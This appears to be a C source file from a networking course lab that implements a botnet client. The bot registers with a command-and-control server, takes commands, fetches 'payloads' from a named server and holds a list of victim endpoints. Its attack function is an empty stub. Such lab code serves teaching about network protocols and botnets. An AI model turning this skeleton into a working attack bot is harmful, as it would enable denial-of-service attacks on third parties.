//
//
//      mrepro
//      bot.c
//

#include <uganet.h>

#include <string.h>

#define PORT_LEN 22
#define NUM_VICS 20

#define REG_MSG   "REG\n"
#define HELLO_MSG "HELLO\n"

#define CMD_TCP '1'
#define CMD_UDP '2'
#define CMD_RUN '3'
#define CMD_FIN '4'


typedef struct
{
        char   ip[ UGA_IPv4_STRLEN ] ;
        char port[        PORT_LEN ] ;
} endpoint ;

typedef struct
{
        char       command             ;
        endpoint endpoints[ NUM_VICS ] ;
} message_t ;

static uga_sock_conf const udp_config = { UGA_SFAM_UNSPEC, UGA_SOCK_DGRAM , 0 } ;
static uga_sock_conf const tcp_config = { UGA_SFAM_UNSPEC, UGA_SOCK_STREAM, 0 } ;

void print_help ( void ) ;

void do_prog   ( message_t const * command, uga_string       * payload, uga_sock_conf const * config ) ;
void do_attack ( message_t const * command, uga_string const * payload                               ) ;

int main ( int argc, char ** argv )
{
        uga_log_init() ;

        if( argc < 3 )
        {
                print_help() ;
                return 1 ;
        }
        uga_string_view   ip = uga_sv_create_1( argv[ 1 ] ) ;
        uga_string_view port = uga_sv_create_1( argv[ 2 ] ) ;

        UGA_INFO_S( "lab2::bot", "cnc config: ip: %s, port: %s", ip, port ) ;

        uga_socket cnc_sock = uga_sock_create_and_connect_configured( ip, port, &udp_config ) ;
        uga_print_abort_if_err() ;

        UGA_INFO_S( "lab2::bot", "connected to CnC server" ) ;

        uga_send( &cnc_sock, REG_MSG, strlen( REG_MSG ), 0 ) ;
        uga_print_abort_if_err() ;

        UGA_INFO_S( "lab2::bot", "sent REG to CnC" ) ;

        message_t message = { 0 } ;
        uga_string payload = uga_str_create_1( 1024 ) ;

        while( true )
        {
                uga_recv( &cnc_sock, &message, sizeof( message ), 0 ) ;
                UGA_INFO_S( "lab2::bot", "received command: %c", message.command ) ;

                switch( message.command )
                {
                        case CMD_TCP:
                                do_prog( &message, &payload, &tcp_config ) ;
                                break ;
                        case CMD_UDP:
                                do_prog( &message, &payload, &udp_config ) ;
                                break ;
                        case CMD_RUN:
                                do_attack( &message, &payload ) ;
                                break ;
                        case CMD_FIN:
                                UGA_ERR_S( "lab2::bot", "received QUIT command" ) ;
                                goto fin ;
                        default:
                                UGA_ERR_S( "lab2::bot", "unknown command received" ) ;
                                break ;
                }
        }
fin:
        uga_str_destroy( &payload ) ;
        uga_sock_close( &cnc_sock ) ;

        return 0 ;
}

void do_prog ( message_t const * command, uga_string * payload, uga_sock_conf const * config )
{
        uga_socket serv_sock = uga_sock_create_and_connect_configured(
                                        uga_sv_create_1( command->endpoints[ 0 ].  ip ),
                                        uga_sv_create_1( command->endpoints[ 0 ].port ),
                                        config
        ) ;
        UGA_RETURN_ON_ERR() ;
        UGA_INFO_S( "lab2::bot::do_prog", "connected to server" ) ;

        uga_send( &serv_sock, HELLO_MSG, strlen( HELLO_MSG ), 0 ) ;
        UGA_RETURN_ON_ERR() ;
        UGA_INFO_S( "lab2::bot::do_prog", "sent HELLO to server" ) ;

        uga_str_clear( payload ) ;
        uga_str_reserve( payload, 1024 ) ;

        i32_t brecvd = uga_recv( &serv_sock, payload->data, payload->capacity, 0 ) ;
        payload->size = brecvd ;
        UGA_INFO_S( "lab2::bot::do_prog", "received new payloads: "STR_FMT, STR_ARG( *payload ) ) ;

        uga_sock_close( &serv_sock ) ;
}

void do_attack ( message_t const * command, uga_string const * payload )
{
        ( void ) command ;
        ( void ) payload ;
}

void print_help ( void )
{
        UGA_ERR( "usage: ./bot ip port" ) ;
}
